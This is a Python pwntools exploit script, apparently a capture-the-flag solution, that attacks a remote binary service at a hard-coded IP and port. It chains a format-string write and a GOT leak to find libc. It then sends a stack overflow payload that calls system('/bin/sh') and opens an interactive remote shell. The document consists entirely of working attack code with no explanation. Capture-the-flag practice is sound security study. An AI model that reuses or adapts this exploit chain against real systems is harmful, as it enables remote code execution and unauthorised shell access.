from pwn import *
from LibcSearcher import *

context(log_level="debug")
context.gdb_binary = "/bin/pwndbg"
x_addr = 0x0804C030

payload = p32(x_addr)
payload += b"%1c%4$hhn"
elf = ELF("./attachment-9")
libc = ELF("./libc6-i386_2.31-0ubuntu9.17_amd64.so")

#io = process("./attachment-9")
io = connect("39.96.193.120", 10000)

libc_start_main_got = elf.got['__libc_start_main']

payload = b"%5c%7$n%8$sa" + p32(x_addr) + p32(libc_start_main_got)

io.recvuntil(b"Hope you have a good time here.\n")
io.sendline(payload)
raw = io.recv(10)
leaked = u32(raw[5:9])
print(hex(leaked))
libc_base = leaked - libc.symbols['__libc_start_main']
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b"/bin/sh\x00"))
print("/bin/sh address: ", hex(bin_sh_addr))
payload = b"a" * (0x90 + 0x4) + p32(system_addr) + b"bbbb" + p32(bin_sh_addr)
io.recvuntil(b"Input:\n")
io.sendline(payload)
io.interactive()
